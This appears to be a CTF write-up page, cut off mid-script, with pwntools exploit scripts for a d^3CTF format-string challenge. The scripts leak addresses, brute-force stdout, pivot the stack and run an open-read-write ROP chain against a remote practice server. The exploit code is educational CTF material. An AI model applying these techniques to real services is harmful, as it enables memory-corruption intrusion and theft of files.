+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;d^3CTF\x00\x00&#x27;</span></span><br><span class="line">   payload += <span class="string">&#x27;flag\x00\x00\x00\x00&#x27;</span></span><br><span class="line">   payload += p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">   <span class="comment"># open(flag_addr,0)</span></span><br><span class="line">   payload += p64(pop_rdi_addr) + p64(base_addr + <span class="number">0x202068</span>)</span><br><span class="line">   payload += p64(pop_rsi_r15_addr) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">   payload += p64(open_addr)</span><br><span class="line"></span><br><span class="line">   <span class="comment"># read(1,base_addr+0x202060+0x300,0x100)</span></span><br><span class="line">   payload += p64(pop_rdi_addr) + p64(<span class="number">1</span>)</span><br><span class="line">   payload += p64(pop_rsi_r15_addr) + p64(base_addr + <span class="number">0x202060</span> + <span class="number">0x300</span>) + p64(<span class="number">0</span>)</span><br><span class="line">   payload += p64(pop_rdx_addr) + p64(<span class="number">0x100</span>)</span><br><span class="line">   payload += p64(read_addr)</span><br><span class="line"></span><br><span class="line">   <span class="comment"># write(2,base_addr+0x202060+0x300,0x100)</span></span><br><span class="line">   payload += p64(pop_rdi_addr) + p64(<span class="number">2</span>)</span><br><span class="line">   payload += p64(pop_rsi_r15_addr) + p64(base_addr + <span class="number">0x202060</span> + <span class="number">0x300</span>) + p64(<span class="number">0</span>)</span><br><span class="line">   payload += p64(pop_rdx_addr) + p64(<span class="number">0x100</span>)</span><br><span class="line">   payload += p64(write_addr)</span><br><span class="line">   p.sendline(payload)</span><br><span class="line">   p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><h3 id="获取libc基地址，用libc库里的gadget执行orw获取flag"><a href="#获取libc基地址，用libc库里的gadget执行orw获取flag" class="headerlink" title="获取libc基地址，用libc库里的gadget执行orw获取flag"></a>获取libc基地址，用libc库里的gadget执行orw获取flag</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># from pwncli import *</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    <span class="comment"># gdb.attach(p)</span></span><br><span class="line">    libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">    io_stderr_addr = libc.symbols[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;io_stderr_addr------------&gt;&#x27;</span>, <span class="built_in">hex</span>(io_stderr_addr))</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">    print_ret_addr = leak_addr - <span class="number">0x20</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;print_ret_addr--------&gt;&#x27;</span>, <span class="built_in">hex</span>(print_ret_addr))</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;构造栈链，第一次构造一个指向buf的栈地址&#x27;&#x27;&#x27;</span></span><br><span class="line">    leak = (leak_addr) &amp; <span class="number">0xff</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(leak))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(leak) + <span class="string">&#x27;c%6$hhn&#x27;</span></span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    rsp_addr = <span class="number">0xbbd</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;第二次通过指向buf的栈地址，将buf修改为stdout&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x20</span>) + <span class="string">&#x27;c%10$hhn&#x27;</span></span><br><span class="line">    p.sendline(payload)</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;第三次通过stdout将_IO_2_1_stdout_改成_IO_2_1_stderr_值，此时需要爆破倒数第二字节的前半字节，猜测为0，概率1/16&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    stderr = io_stderr_addr &amp; <span class="number">0xfff</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;stderr------------&gt;&#x27;</span>, <span class="built_in">hex</span>(stderr))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(stderr) + <span class="string">&#x27;c%9$hn&#x27;</span></span><br><span class="line">    p.sendline(payload)</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;下面来判断是否将stdout指向的值改写成stderr指向的值&#x27;&#x27;&#x27;</span></span><br><span class="line">    p.sendline(<span class="string">&#x27;aaaaaaa&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        x = p.recvuntil(<span class="string">&#x27;aa&#x27;</span>, timeout=<span class="number">0.5</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;aa&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> x:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;XXXXXX&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;success-----------------------------------------&#x27;</span>)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    payload = <span class="string">&#x27;%19$p%15$p%6$p&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line">    main_addr = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">    <span class="comment"># main_addr=u64(p.recv(6).ljust(8,&#x27;\x00&#x27;))</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;main_addr----------&gt;&#x27;</span>, <span class="built_in">hex</span>(main_addr))</span><br><span class="line">    base_addr = main_addr - <span class="number">0xb24</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;base_addr----------&gt;&#x27;</span>, <span class="built_in">hex</span>(base_addr))</span><br><span class="line">    pause()</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line">    leak_libc = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;leak_libc-------------&gt;&#x27;</span>, <span class="built_in">hex</span>(leak_libc))</span><br><span class="line">    libc_base = leak_libc - <span class="number">0x21b97</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;libc_base---------&gt;&#x27;</span>, <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line">    rsp_hook = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;rsp_hook----------&gt;&#x27;</span>, <span class="built_in">hex</span>(rsp_hook))</span><br><span class="line"></span><br><span class="line">    rsp_addr = rsp_addr + base_addr</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;rsp_addr-----------------------&gt;&#x27;</span>, <span class="built_in">hex</span>(rsp_addr))</span><br><span class="line">    rsp_addr = rsp_addr &amp; <span class="number">0xffff</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;rsp_addr-----------------------&gt;&#x27;</span>, <span class="built_in">hex</span>(rsp_addr))</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    hook1 = (rsp_hook + <span class="number">8</span>) &amp; <span class="number">0xff</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;hook1-------------&gt;&#x27;</span>, <span class="built_in">hex</span>(hook1))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(hook1) + <span class="string">&#x27;c%6$hhn&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将menu函数的返回地址修改成pop rsp</span></span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(rsp_addr) + <span class="string">&#x27;c%10$hn&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 写入bss段指针</span></span><br><span class="line">    bss_hook = rsp_hook + <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 布置迁移地址bss_addr+0x10  因为bss要存放d^3CTF and flag</span></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;bss_hook1-------------&gt;&quot;</span>, <span class="built_in">hex</span>(bss_hook))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((bss_hook &amp; <span class="number">0xffff</span>)) + <span class="string">&#x27;c%6$hhn&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    bss_addr = base_addr + <span class="number">0x202060</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;bss1_addr-------------&gt;&quot;</span>, <span class="built_in">hex</span>(bss_addr &amp; <span class="number">0xffff</span>))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((bss_addr + <span class="number">0x10</span>) &amp; <span class="number">0xffff</span>) + <span class="string">&#x27;c%10$hn&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    bss_hook = bss_hook + <span class="number">2</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;bss_hook2--------------&gt;&#x27;</span>, <span class="built_in">hex</span>(bss_hook))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((bss_hook &amp; <span class="number">0xffff</span>)) + <span class="string">&#x27;c%6$hhn&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;bss2_addr-------------&gt;&quot;</span>, <span class="built_in">hex</span>((bss_addr &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xffff</span>))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(((bss_addr) &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xffff</span>) + <span class="string">&#x27;c%10$hn&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    bss_hook = bss_hook + <span class="number">2</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;bss_hook3--------------&gt;&#x27;</span>, <span class="built_in">hex</span>(bss_hook))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((bss_hook &amp; <span class="number">0xffff</span>)) + <span class="string">&#x27;c%6$hhn&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;bss2_addr-------------&gt;&quot;</span>, <span class="built_in">hex</span>((bss_addr &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xffff</span>))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(((bss_addr) &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xffff</span>) + <span class="string">&#x27;c%10$hn&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    pop_rdx_addr = <span class="number">0x1b96</span> + libc_base</span><br><span class="line">    pop_rdi_addr = base_addr + <span class="number">0xbc3</span></span><br><span class="line">    pop_rsi_r15_addr = base_addr + <span class="number">0xbc1</span></span><br><span class="line">    read_addr = <span class="number">0x110070</span> + libc_base</span><br><span class="line">    write_addr = libc_base + <span class="number">0x110140</span></span><br><span class="line">    open_addr = libc_base + <span class="number">0x10fc40</span></span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&#x27;d^3CTF\x00\x00&#x27;</span></span><br><span class="line">    payload += <span class="string">&#x27;flag\x00\x00\x00\x00&#x27;</span></span><br><span class="line">    payload += p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">    <span class="comment"># open(flag_addr,0)</span></span><br><span class="line">    payload += p64(pop_rdi_addr) + p64(base_addr + <span class="number">0x202068</span>)</span><br><span class="line">    payload += p64(pop_rsi_r15_addr) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">    payload += p64(open_addr)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># read(1,base_addr+0x202060+0x300,0x100)</span></span><br><span class="line">    payload += p64(pop_rdi_addr) + p64(<span class="number">1</span>)</span><br><span class="line">    payload += p64(pop_rsi_r15_addr) + p64(base_addr + <span class="number">0x202060</span> + <span class="number">0x300</span>) + p64(<span class="number">0</span>)</span><br><span class="line">    payload += p64(pop_rdx_addr) + p64(<span class="number">0x100</span>)</span><br><span class="line">    payload += p64(read_addr)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># write(2,base_addr+0x202060+0x300,0x100)</span></span><br><span class="line">    payload += p64(pop_rdi_addr) + p64(<span class="number">2</span>)</span><br><span class="line">    payload += p64(pop_rsi_r15_addr) + p64(base_addr + <span class="number">0x202060</span> + <span class="number">0x300</span>) + p64(<span class="number">0</span>)</span><br><span class="line">    payload += p64(pop_rdx_addr) + p64(<span class="number">0x100</span>)</span><br><span class="line">    payload += p64(write_addr)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="comment">#p = process(&#x27;./a&#x27;)</span></span><br><span class="line">    p=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">28285</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line">    leak_addr = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(leak_addr &amp; <span class="number">0xffff</span>))</span><br><span class="line">    pwn()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/upload/img/image-20220429204629254.png" alt="image-20220429204629254"></p>
+<h3 id="用shellcode执行orw"><a href="#用shellcode执行orw" class="headerlink" title="用shellcode执行orw"></a>用shellcode执行orw</h3><p>这个本地看到flag了，但是远程有问题，也在此记录一下。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from pwncli import *</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">    io_stderr_addr = libc.symbols[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;io_stderr_addr------------&gt;&#x27;</span>, <span class="built_in">hex</span>(io_stderr_addr))</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">    print_ret_addr = leak_addr - <span class="number">0x20</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;print_ret_addr--------&gt;&#x27;</span>, <span class="built_in">hex</span>(print_ret_addr))</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;构造栈链，第一次构造一个指向buf的栈地址&#x27;&#x27;&#x27;</span></span><br><span class="line">    leak = (leak_addr) &amp; <span class="number">0xff</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(leak))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(leak) + <span class="string">&#x27;c%6$hhn&#x27;</span></span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    rsp_addr = <span class="number">0xbbd</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;第二次通过指向buf的栈地址，将buf修改为stdout&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x20</span>) + <span class="string">&#x27;c%10$hhn&#x27;</span></span><br><span class="line">    p.sendline(payload)</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;第三次通过stdout将_IO_2_1_stdout_改成_IO_2_1_stderr_值，此时需要爆破倒数第二字节的前半字节，猜测为0，概率1/16&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    stderr = io_stderr_addr &amp; <span class="number">0xfff</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;stderr------------&gt;&#x27;</span>, <span class="built_in">hex</span>(stderr))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(stderr) + <span class="string">&#x27;c%9$hn&#x27;</span></span><br><span class="line">    p.sendline(payload)</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;下面来判断是否将stdout指向的值改写成stderr指向的值&#x27;&#x27;&#x27;</span></span><br><span class="line">    p.sendline(<span class="string">&#x27;aaaaaaa&#x27;</span>)</span><br><span class="line">    x = p.recvuntil(<span class="string">&#x27;aa&#x27;</span>, timeout=<span class="number">0.5</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;aa&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> x:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;XXXXXX&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;success-----------------------------------------&#x27;</span>)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    payload = <span class="string">&#x27;%19$p%15$p%6$p&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span>-<span class="number">1</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span 